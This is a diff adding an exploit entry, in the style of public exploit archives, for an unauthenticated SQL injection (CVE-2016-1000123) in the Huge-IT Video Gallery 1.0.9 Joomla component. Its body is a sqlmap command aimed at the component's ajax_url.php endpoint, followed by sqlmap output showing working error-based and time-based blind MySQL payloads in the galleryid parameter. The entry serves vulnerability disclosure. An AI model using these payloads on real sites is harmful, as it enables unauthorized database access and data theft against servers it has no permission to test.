@@ -1,0 +1,36 @@
+# Exploit Title Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for Joomla
+# Google Dork: [if applicable] 
+# Date: 2016-09-15
+# Exploit Author: Larry W. Cashdollar, @_larry0
+# Vendor Homepage: http://huge-it.com/joomla-video-gallery/
+# Software Link: 
+# Version: 1.0.9
+# Tested on: Linux
+# CVE : CVE-2016-1000123
+# Advisory: http://www.vapidlabs.com/advisory.php?v=169
+# Exploit:
+	• $ sqlmap -u 'http://server/components/com_videogallerylite/ajax_url.php' --data="page=1&galleryid=*&task=load_videos_content&perpage=20&linkbutton=2"
+	• .
+	• .
+	• .
+	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 2870 HTTP(s) requests:
+	• ---
+	• Parameter: #1* ((custom) POST)
+	•     Type: error-based
+	•     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+	•     Payload: page=1&galleryid=-3390 OR 1 GROUP BY CONCAT(0x716b766271,(SELECT (CASE WHEN (2575=2575) THEN 1 ELSE 0 END)),0x7170767071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&task=load_videos_content&perpage=20&linkbutton=2
+	•  
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•     Payload: page=1&galleryid=(CASE WHEN (5952=5952) THEN SLEEP(5) ELSE 5952 END)&task=load_videos_content&perpage=20&linkbutton=2
+	• ---
+	• [19:36:55] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Debian 8.0 (jessie)
+	• web application technology: Apache 2.4.10
+	• back-end DBMS: MySQL >= 5.0.12
+	• [19:36:55] [WARNING] HTTP error codes detected during run:
+	• 500 (Internal Server Error) - 2714 times
+	• [19:36:55] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.4'
+	•  
+	• [*] shutting down at 19:36:55
